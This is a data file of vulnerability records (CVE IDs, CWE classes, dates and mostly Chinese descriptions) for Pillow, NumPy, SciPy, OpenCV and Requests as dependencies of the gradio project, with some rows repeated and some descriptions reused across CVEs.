7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
gradio-app_gradio,Pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
gradio-app_gradio,Pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
gradio-app_gradio,Pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,scipy,,True,CVE-2013-4251,CWE-269,2013-10-17,"SciPy是SciPy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 0.12.1之前版本中存在安全漏洞。本地攻击者可利用该漏洞以运行‘scipy.weave’组件的用户权限执行任意代码。",2,0
gradio-app_gradio,scipy,,True,CVE-2023-29824,CWE-416,2023-07-06,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 1.8.0之前版本存在安全漏洞，该漏洞源于Py_FindObjects()函数存在内存释放后重用问题。",1,2
gradio-app_gradio,scipy,,True,CVE-2023-25399,CWE-401,2023-07-05,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 存在安全漏洞，该漏洞源于在Py_FindObjects()函数中存在导致潜在内存泄漏的重新计数问题。",3,0
gradio-app_gradio,opencv-python-headless,,True,CVE-2019-9423,CWE-787,2019-08-21,"Android是美国谷歌（Google）和开放手持设备联盟（简称OHA）的一套以Linux为基础的开源操作系统。
Android 10版本中的opencv调用存在缓冲区错误漏洞，该漏洞源于程序缺少边界检查。攻击者可利用该漏洞提升权限。",2,0
gradio-app_gradio,opencv-python-headless,,True,CVE-2019-5063,CWE-120 CWE-787,2020-01-02,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.1.0版本中的‘persistence’模式存在缓冲区错误漏洞。远程攻击者可借助特制XML文件利用该漏洞在系统上执行任意代码。",2,0
gradio-app_gradio,opencv-python-headless,,True,CVE-2019-5064,CWE-120 CWE-787,2020-01-02,"OpenCV是一款开源的、跨平台的、轻量级计算机视觉库。
OpenCV 4.2.0之前版本中的持久性数据结构功能存在缓冲区错误漏洞。攻击者可通过特制的JSON文件造成缓冲区溢出，进而导致多个堆损坏并可能执行代码。",2,0
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-34141,CWE-697,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9存在安全漏洞，该漏洞源于软件中不完整的字符串比较。它允许攻击者可利用该漏洞通过构造特定的字符串对象来破坏api。",3,2
gradio-app_gradio,numpy,,True,CVE-2014-1858,CWE-20,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.8.1之前的版本中的f2py的__init__.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,numpy,,True,CVE-2017-12852,CWE-835,2017-08-15,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
Numpy 1.13.1及之前的版本中的‘numpy.pad’函数存在安全漏洞，该漏洞源于程序缺少输入验证。攻击者可利用该漏洞造成拒绝服务（无限循环）。",2,1
gradio-app_gradio,numpy,,True,CVE-2014-1859,CWE-59,2014-02-05,"NumPy是一个Python科学计算包，它支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。

NumPy 1.8.1之前的版本中的core/tests/test_memmap.py、core/tests/test_multiarray.py、f2py/f2py2e.py和lib/tests/test_io.py文件存在安全漏洞。本地攻击者可通过对临时文件实施符号链接攻击利用该漏洞覆盖任意文件。",2,0
gradio-app_gradio,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
gradio-app_gradio,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
gradio-app_gradio,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
gradio-app_gradio,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
gradio-app_gradio,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
gradio-app_gradio,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
gradio-app_gradio,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
gradio-app_gradio,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
gradio-app_gradio,Pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
gradio-app_gradio,Pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
gradio-app_gradio,Pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
gradio-app_gradio,Pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
gradio-app_gradio,Pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
gradio-app_gradio,Pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
